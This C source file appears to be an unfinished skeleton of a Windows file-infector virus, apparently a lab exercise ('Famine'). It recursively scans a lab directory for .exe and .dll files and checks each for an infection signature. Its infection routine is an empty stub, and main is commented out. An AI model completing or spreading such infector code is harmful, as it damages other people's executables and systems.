#include <windows.h>
#include <stdio.h>
#include <string.h>

#define MAX_PATH 260

const char *directory = "C:\\Users\\johnd\\Desktop\\PE-Injection\\target";
const char *signature = "Famine version 1.0 (c)oded by jdecorte";

BOOL IsInfected(const char *filepath)
{
    FILE *file = fopen(filepath, "rb");
    if (!file)
        return FALSE;

    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    if (fileSize < strlen(signature))
    {
        fclose(file);
        return FALSE;
    }

    char *buffer = (char *)malloc(fileSize);
    if (!buffer)
    {
        fclose(file);
        return FALSE;
    }

    size_t bytesRead = fread(buffer, 1, fileSize, file);
    fclose(file);

    BOOL infected = FALSE;
    if (bytesRead == fileSize)
    {
        for (long i = 0; i <= fileSize - strlen(signature); i++)
        {
            if (memcmp(buffer + i, signature, strlen(signature)) == 0)
            {
                infected = TRUE;
                break;
            }
        }
    }

    free(buffer);
    return infected;
}

BOOL InfectFile(const char *filepath)
{
    if (IsInfected(filepath))
    {
        printf("%s already infected\n", filepath);
        return FALSE;
    }


    // add section (woody)
}

void SearchAndInfect(const char *directory)
{
    char searchPath[MAX_PATH];
    WIN32_FIND_DATA findFileData;

    snprintf(searchPath, sizeof(searchPath), "%s\\*", directory);

    HANDLE hFind = FindFirstFile(searchPath, &findFileData);
    if (hFind == INVALID_HANDLE_VALUE)
        return;

    do
    {
        if (strcmp(findFileData.cFileName, ".") == 0 || strcmp(findFileData.cFileName, "..") == 0)
            continue;

        char filePath[MAX_PATH];
        snprintf(filePath, sizeof(filePath), "%s\\%s", directory, findFileData.cFileName);

        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            SearchAndInfect(filePath);
        else if (strstr(findFileData.cFileName, ".exe") || strstr(findFileData.cFileName, ".dll"))
            InfectFile(filePath);

    } while (FindNextFile(hFind, &findFileData) != 0);

    FindClose(hFind);
}

// int main()
// {
//     SearchAndInfect(directory);
//     return 0;
// }